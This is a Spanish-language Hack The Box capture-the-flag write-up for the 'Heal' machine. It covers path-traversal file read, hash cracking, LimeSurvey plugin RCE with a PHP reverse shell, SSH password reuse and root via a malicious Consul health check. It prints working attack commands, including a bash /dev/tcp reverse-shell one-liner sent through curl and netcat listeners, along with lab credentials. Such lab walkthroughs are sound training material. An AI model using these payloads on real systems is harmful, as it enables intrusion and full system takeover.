---
title: Heal
description: Heal es una máquina Linux de dificultad media que presenta un sitio web vulnerable a lectura arbitraria de archivos, lo que permite extraer credenciales sensibles. El servidor también aloja una instancia de LimeSurvey, donde las credenciales filtradas pueden utilizarse para iniciar sesión como administrador. Dado que los administradores pueden subir plugins, se puede aprovechar esta funcionalidad para cargar un plugin malicioso y obtener una reverse shell como el usuario www-data. Una enumeración adicional revela la contraseña de la base de datos de LimeSurvey, que es reutilizada por el usuario del sistema ron, lo que permite escalar el acceso. El servidor también ejecuta una instancia local del Consul Agent como root. Registrando un servicio malicioso a través de la API de Consul, se puede escalar privilegios y obtener acceso como root.
date: 2025-02-09
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-heal/heal_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - tcp
  - ssh
  - http
  - devtools
  - arbitrary_file_read
  - path_traversal
  - php
  - cve
  - fuzzing_web
  - rce
  - password_attacks
  - interactive_tty
  - data_leaks
  - port_forwarding
  - api
  - information_gathering
  - web_analysis
  - vulnerability_exploitation
  - cve_exploitation
  - lateral_movement
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/heal:-$ ping -c 1 10.10.11.46
PING 10.10.11.46 (10.10.11.46) 56(84) bytes of data.
64 bytes from 10.10.11.46: icmp_seq=1 ttl=63 time=308 ms

--- 10.10.11.46 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 307.576/307.576/307.576/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/heal:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.46 -n -oG nmap1
Host: 10.10.11.46 ()    Status: Up
Host: 10.10.11.46 ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/heal:-$ sudo nmap -sCV -p22,80 -vvv 10.10.11.46 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWKy4neTpMZp5wFROezpCVZeStDXH5gI5zP4XB9UarPr/qBNNViyJsTTIzQkCwYb2GwaKqDZ3s60sEZw362L0o=
|   256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMCYbmj9e7GtvnDNH/PoXrtZbCxr49qUY8gUwHmvDKU
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://heal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```terminal
/home/kali/Documents/htb/machines/heal:-$ echo '10.10.11.46\theal.htb' | sudo tee -a /etc/hosts

/home/kali/Documents/htb/machines/heal:-$ whatweb heal.htb
http://heal.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.46], Script, Title[Heal], X-Powered-By[Express], nginx[1.18.0]
```

---
## Web Analysis

El servicio web presenta inicialmente un formulario de inicio de sesión.

![](assets/img/htb-writeup-heal/heal1_1.png)

Luego de registrarme, ingreso y accedo al endpoint `/resume`.

![](assets/img/htb-writeup-heal/heal1_3.png)

Este endpoint, titulado "Resume Builder", permite construir un currículum que puede descargarse como PDF mediante un botón al final de la página.

![](assets/img/htb-writeup-heal/heal1_4.png)

Desde la pestaña `Network` en DevTools, detecto peticiones a un subdominio no descubierto anteriormente, `api.heal.htb`.

![](assets/img/htb-writeup-heal/heal1_5.png)

En la ruta `/survey`, se muestra un botón "Take the Survey" que redirige a otro subdominio, `take-survey.heal.htb`.

![](assets/img/htb-writeup-heal/heal1_7.png)

Con esta información, configuro el archivo `/etc/hosts` para incluir todos los subdominios identificados.

```terminal
/home/kali/Documents/htb/machines/heal:-$ sudo sed -i '$d' /etc/hosts
/home/kali/Documents/htb/machines/heal:-$ echo '10.10.11.46\theal.htb\tapi.heal.htb\ttake-survey.heal.htb' | sudo tee -a /etc/hosts

/home/kali/Documents/htb/machines/heal:-$ whatweb api.heal.htb
http://api.heal.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.46], Title[Ruby on Rails 7.1.4], UncommonHeaders[x-content-type-options,x-permitted-cross-domain-policies,referrer-policy,x-request-id], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[0], nginx[1.18.0]
```

Identifico que `api.heal.htb` utiliza Ruby on Rails versión 7.1.4, tecnología que puede ser relevante durante la explotación.

![](assets/img/htb-writeup-heal/heal1_6.png)

Por el lado de `take-survey.heal.htb`, inicialmente lo único destacable es la mención del usuario Administrador llamado `ralph` y la presencia del software LimeSurvey.

![](assets/img/htb-writeup-heal/heal1_8.png)

Luego, ejecutando un escaneo de directorios, identifico múltiples rutas válidas.

```terminal
/home/kali/Documents/htb/machines/heal:-$ dirb http://take-survey.heal.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
---- Scanning URL: http://take-survey.heal.htb/ ----
==> DIRECTORY: http://take-survey.heal.htb/admin/
+ http://take-survey.heal.htb/Admin (CODE:302|SIZE:0)
==> DIRECTORY: http://take-survey.heal.htb/application/
==> DIRECTORY: http://take-survey.heal.htb/assets/
==> DIRECTORY: http://take-survey.heal.htb/docs/
==> DIRECTORY: http://take-survey.heal.htb/editor/
+ http://take-survey.heal.htb/index.php (CODE:200|SIZE:75816)
==> DIRECTORY: http://take-survey.heal.htb/installer/
+ http://take-survey.heal.htb/LICENSE (CODE:200|SIZE:49474)
==> DIRECTORY: http://take-survey.heal.htb/locale/
==> DIRECTORY: http://take-survey.heal.htb/modules/
==> DIRECTORY: http://take-survey.heal.htb/plugins/
+ http://take-survey.heal.htb/surveys (CODE:200|SIZE:75816)
==> DIRECTORY: http://take-survey.heal.htb/themes/
==> DIRECTORY: http://take-survey.heal.htb/tmp/
==> DIRECTORY: http://take-survey.heal.htb/upload/
+ http://take-survey.heal.htb/uploader (CODE:401|SIZE:4569)
==> DIRECTORY: http://take-survey.heal.htb/vendor/
```

Una de ellas, es un panel de login.

![](assets/img/htb-writeup-heal/heal1_9.png)

---
## Vulnerability Exploitation

Al hacer clic en el botón "Export to PDF", noté que la aplicación realiza primero una solicitud POST a `api.heal.htb/exports`. Inmediatamente después, se lanza una solicitud GET a `api.heal.htb/download?filename=xxxxxxxxxxxxxxxxxxxx.pdf`, encargada de descargar el archivo PDF generado.

Interceté la primer solicitud y extraje el token JWT desde la cabecera `Authorization`. Luego, reutilicé ese mismo token para hacer una solicitud a la ruta `api.heal.htb/download`, esta vez modificando el método a GET y alterando el valor del parámetro `filename` por una ruta arbitraria del sistema.

```http
GET /download?filename=/etc/passwd HTTP/1.1
Host: api.heal.htb
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo1fQ.7HQbv7vTQa-UIbcu3TPdEgxs3zZG0tYpT-yOC5uxMbM
```

{% include embed/video.html src='assets/img/htb-writeup-heal/heal2_1.webm' types='webm' title='Arbitrary File Read' autoplay=true loop=true muted=true %}

Como resultado, obtuve el contenido del archivo `/etc/passwd`, lo que confirma la presencia de un Arbitrary File Read.

---

Sabía que el backend de `api.heal.htb` estaba desarrollado en Ruby on Rails, por lo que consulté su [estructura de directorios](https://www.tutorialspoint.com/ruby-on-rails/rails-directory-structure.htm) oficial para identificar rutas sensibles.

Solicité el archivo `Gemfile` y confirmé que la aplicación utiliza sqlite3 como base de datos.

```http
GET /download?filename=../../Gemfile HTTP/1.1
```

![](assets/img/htb-writeup-heal/heal2_2.png)

La base de datos debía estar en el directorio `/storage`, accedí al archivo de configuración `database.yml` donde encontré el nombre de la base de datos definida como `development.sqlite3`.

```http
GET /download?filename=../../config/database.yml HTTP/1.1
```

![](assets/img/htb-writeup-heal/heal2_3.png)

Con esta información, localicé la base da datos y la descargué a mi máquina.

```http
GET /download?filename=../../storage/development.sqlite3 HTTP/1.1
```

![](assets/img/htb-writeup-heal/heal2_4.png)

---

Analicé el contenido de la base de datos y filtré las entradas de la tabla users.

```terminal
/home/kali/Documents/htb/machines/heal:-$ sqlite3 development.sqlite3 .dump | grep 'INSERT INTO users'
INSERT INTO users VALUES(1,'ralph@heal.htb','$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG','2024-09-27 07:49:31.614858','2024-09-27 07:49:31.614858','Administrator','ralph',1);
INSERT INTO users VALUES(2,'user@heal.htb','$2a$12$y9FotM5ggKIVEAuaeJz67.VZGXYtkx/6t2ktqEBl5M9BiHZcSRjbm','2025-05-22 17:26:24.688639','2025-05-22 17:26:24.688639','user name','username',0);
INSERT INTO users VALUES(3,'tester3@test.com','$2a$12$SdKhmjs1gDNlJI1.Z2MLRuq0tbxPgmBus9WZmv6MdJZH0UQR97Fhu','2025-05-22 17:47:06.056468','2025-05-22 17:47:06.056468','tester3','tester3',0);
INSERT INTO users VALUES(4,'user2@heal.htb','$2a$12$9mwrJNqw0Onwbj5Zwlc4OO46hi8G1jHwHxDoPUEqrsfwLFgcxNe1W','2025-05-22 18:15:18.002283','2025-05-22 18:15:18.002283','user name','username2',0);
```

Entre los registros, se encuentra ralph el usuario Administrator. Tomó el hash bcrypt y lo crackeo con hashcat.

```terminal
/home/kali/Documents/htb/machines/heal:-$ hashcat --show '$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG'
   # | Name                                            | Category
=====+=================================================+==============================
 3200 | bcrypt $2*$, Blowfish (Unix)                   | Operating System

/home/kali/Documents/htb/machines/heal:-$ hashcat -a 0 -m 3200 ralf-hash.txt /usr/share/wordlists/rockyou.txt
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
```

Así obtuve credenciales válidas `ralph`:`147258369`, para iniciar sesión como administrador en LimeSurvey.

![](assets/img/htb-writeup-heal/heal3_1.png)
![](assets/img/htb-writeup-heal/heal3_2.png)

---
## CVE Exploitation

Desde el panel de administración de LimeSurvey, puedo confirmar que el sistema está utilizando la versión 6.6.4. Esta versión resulta vulnerable a RCE [CVE-2021-44967](https://nvd.nist.gov/vuln/detail/cve-2021-44967). El fallo permite a un administrador subir e instalar plugins personalizados desde la interfaz, permitiendo ejecutar código PHP arbitrario si se carga un plugin malicioso, lo que habilita una shell inversa sin necesidad de explotación adicional.

![](assets/img/htb-writeup-heal/heal3_3.png)

Para aprovechar esta falla, utilizo el método publicado por [Y1LD1R1M-1337](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE), el cual consiste en empaquetar una [reverse shell en PHP](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) junto con un archivo `config.xml` estructurado como un plugin válido. Este archivo XML declara la metadata del plugin, así como las versiones de LimeSurvey compatibles.

```terminal
/home/kali/Documents/htb/machines/heal:-$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O revshell.php
/home/kali/Documents/htb/machines/heal:-$ wget https://raw.githubusercontent.com/Y1LD1R1M-1337/Limesurvey-RCE/refs/heads/main/config.xml
```

Descargo ambos archivos pero antes de empaquetarlos, edito el `config.xml` y agrego explícitamente compatibilidad con la `versión 6.0`.

```terminal
/home/kali/Documents/htb/machines/heal:-$ cat config.xml              
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>3xplo1t</name>
        <type>plugin</type>
        <creationDate>2020-03-20</creationDate>
        <lastUpdate>2020-03-31</lastUpdate>
        <author>Y1LD1R1M</author>
        <authorUrl>https://github.com/Y1LD1R1M-1337</authorUrl>
        <supportUrl>https://github.com/Y1LD1R1M-1337</supportUrl>
        <version>5.0</version>
        <license>GNU General Public License version 2 or later</license>
        <description>
                <![CDATA[Author : Y1LD1R1M]]></description>
    </metadata>

    <compatibility>
        <version>3.0</version>
        <version>4.0</version>
        <version>5.0</version>
        <version>6.0</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```

Una vez ajustado el archivo, comprimo ambos en un `zip`.

```terminal
/home/kali/Documents/htb/machines/heal:-$ zip exploit revshell.php config.xml
```

Voy a `Configuration` → `Plugins` → `Upload & Install`, selecciono el archivo comprimido y procedo a instalar y activar el plugin malicioso.

{% include embed/video.html src='assets/img/htb-writeup-heal/heal3_4.webm' types='webm' title='CVE-2021-44967 Exploitation' autoplay=true loop=true muted=true %}

Con el plugin activo, levanto un listener en mi máquina.

```terminal
/home/kali/Documents/htb/machines/heal:-$ nc -nvlp 4321
	listening on [any] 4321 ...
```

Y simplemente accedo al archivo PHP a través del navegador o con curl, apuntando a la ruta del plugin.

```terminal
/home/kali/Documents/htb/machines/heal:-$ curl http://take-survey.heal.htb/upload/plugins/3xplo1t/revshell.php

	... connect to [10.10.16.31] from (UNKNOWN) [10.10.11.46] 57290

/home/kali/Documents/htb/machines/heal:-$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
## Lateral Movement

```terminal
/home/kali/Documents/htb/machines/heal:-$ script /dev/null -c bash
www-data@heal:/$ ^Z

/home/kali/Documents/htb/machines/heal:-$ stty raw -echo;fg
[1]  + continued  nc -nvlp 4321
                               reset xterm

www-data@heal:/$ export TERM=xterm
www-data@heal:/$ export SHELL=bash
www-data@heal:/$ stty rows 42 columns 172
```

Una vez con un entorno más manejable, enumero los usuarios del sistema buscando entradas con shells válidas.

```terminal
www-data@heal:~$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

Entre los usuarios listados se encuentran `ralph` y `ron`, lo que sugiere que son cuentas válidas del sistema. Para intentar escalar privilegios o pivotear lateralmente, empiezo a buscar archivos de configuración que puedan contener credenciales reutilizadas o información sensible.

```terminal
www-data@heal:~$ find . -name \*conf\* 2>/dev/null | grep -v '/lib/\|/tmp/\|/vendor/\|/themes/\|/assets/\|/node_modules/'
...[snip]...
./limesurvey/application/config
...[snip]...
```

Al inspeccionar el archivo `config.php`, encuentro credenciales en texto plano.

```terminal
www-data@heal:/$ cat limesurvey/application/config/config.php
```

![](assets/img/htb-writeup-heal/heal4_1.png)

Esta contraseña `AdmiDi0_pA$$w0rd`, es reutilizada en el servicio SSH por el usuario `ron`.

```terminal
/home/kali/Documents/htb/machines/heal:-$ ssh ron@heal.htb
ron@heal.htb's password: AdmiDi0_pA$$w0rd

ron@heal:~$ id
uid=1001(ron) gid=1001(ron) groups=1001(ron)

ron@heal:~$ cat user.txt
```

---
## Privilege Escalation

Desde la sesión con el usuario ron, inspecciono los servicios en ejecución.

```terminal
ron@heal:~$ ss -tulnp
```

![](assets/img/htb-writeup-heal/heal4_2.png)

El puerto 8500 expone un servicio web que aparentemente no está accesible de forma remota. Al realizar una solicitud HTTP local, observo un redireccionamiento hacia `/ui/`, lo que sugiere la presencia de una interfaz web.

```terminal
ron@heal:~$ curl 127.0.0.1:8500 -v
*   Trying 127.0.0.1:8500...
* Connected to 127.0.0.1 (127.0.0.1) port 8500 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:8500
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< Content-Type: text/html; charset=utf-8
< Location: /ui/
< Date: Thu, 22 May 2025 22:38:11 GMT
< Content-Length: 39
< 
<a href="/ui/">Moved Permanently</a>.

* Connection #0 to host 127.0.0.1 left intact
```

Para interactuar con este servicio desde mi máquina, establezco un túnel SSH.

```terminal
/home/kali/Documents/htb/machines/heal:-$ ssh -L 8500:127.0.0.1:8500 ron@heal.htb -N -f
ron@heal.htb's password: AdmiDi0_pA$$w0rd
```

Al acceder al panel web desde el navegador, confirmo que se trata de Consul v1.19.2. Una búsqueda rápida revela que esta versión es vulnerable a ejecución remota de comandos mediante la API de health checks.

![](assets/img/htb-writeup-heal/heal4_3.png)

Inicio un listener en mi máquina.

```terminal
/home/kali/Documents/htb/machines/heal:-$ nc -nvlp 443
	listening on [any] 443 ...
```

A partir de [exploit-db/51117](https://www.exploit-db.com/exploits/51117), elaboro un one liner adaptado al entorno. Envío una petición PUT a la API de Consul que registra un nuevo servicio con un health check malicioso. Este ejecuta una reverse shell hacia mi equipo. Como resultado, recibo una conexión reversa con privilegios de `root`.

```terminal
/home/kali/Documents/htb/machines/heal:-$ curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -H "X-Consul-Token: 0" -H "Content-Type: application/json" -d '{"Address": "127.0.0.1", "Check": {"Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.15.46/443 0>&1"], "Interval": "10s", "Timeout": "864000s"}, "ID": "gato", "Name": "gato", "Port": 80}'

	... connect to [10.10.16.31] from (UNKNOWN) [10.10.11.46] 58660

root@heal:/# id
uid=0(root) gid=0(root) groups=0(root)

root@heal:/# cat /root/root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/640" target="_blank">Heal Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }
